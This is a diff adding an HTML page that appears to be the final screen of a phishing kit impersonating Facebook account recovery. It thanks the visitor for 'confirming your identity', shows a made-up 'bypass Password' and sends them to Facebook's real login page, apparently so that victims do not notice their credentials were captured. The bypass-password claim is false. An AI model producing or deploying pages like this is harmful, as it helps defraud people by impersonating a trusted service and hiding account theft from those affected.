@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pending</title>
+    <style>
+        body {
+            background-color: #ffffff; /* Set background to pure white */
+            display: flex;
+            justify-content: center;
+            align-items: flex-start; /* Align items to the top */
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            background-color: rgba(249, 255, 224, 0.7); /* Light yellow background with reduced opacity */
+            border-radius: 15px;
+            padding: 20px; /* Padding for spacing */
+            text-align: center;
+            width: 280px; /* Container width */
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-top: 80px; /* Margin for positioning */
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 0 0 10px; /* Margin for spacing */
+            text-align: left; /* Align to the left */
+        }
+        p {
+            font-size: 14px;
+            margin: 5px 0; /* Reduced margin to minimize gaps */
+            line-height: 1.5;
+        }
+        .bypass-code {
+            font-size: 24px; /* Font size */
+            font-weight: bold;
+            background-color: rgba(0, 255, 0, 0.2); /* Green background with 20% opacity */
+            display: inline-block;
+            padding: 5px 10px; /* Padding for the number */
+            margin: 10px 0; /* Equal margin for top and bottom */
+            border-radius: 5px;
+            line-height: 1.2; /* Centering number vertically */
+        }
+        .button {
+            display: block;
+            width: calc(100% - 20px); /* Adjusting width for center alignment */
+            background-color: #007bff;
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 20px auto 0; /* Centering button with auto margins */
+            cursor: pointer;
+            text-align: center;
+        }
+        .button:hover {
+            background-color: #0056b3;
+        }
+        .facebook-link, .important-text {
+            color: blue; /* Set color for Facebook and important text */
+            font-weight: bold; /* Optional: make it bold */
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <p>Thank you for confirming your identity.<br>
+           You can click the button below to get back into your account.<br>
+           You can also go to <span class="facebook-link">Facebook</span> and use this pass as your bypass Password:</p>
+        <div class="bypass-code">Umym3@aQM</div>
+        <p>You can make your account more secure by <span class="important-text">enabling two-factor authentication</span> and <span class="important-text">changing your password</span> after you're logged in.</p>
+        <a class="button" href="https://www.facebook.com/login.php/" target="_blank">Get back into your account</a> <!-- Redirect to Facebook -->
+    </div>
+</body>
+</html>
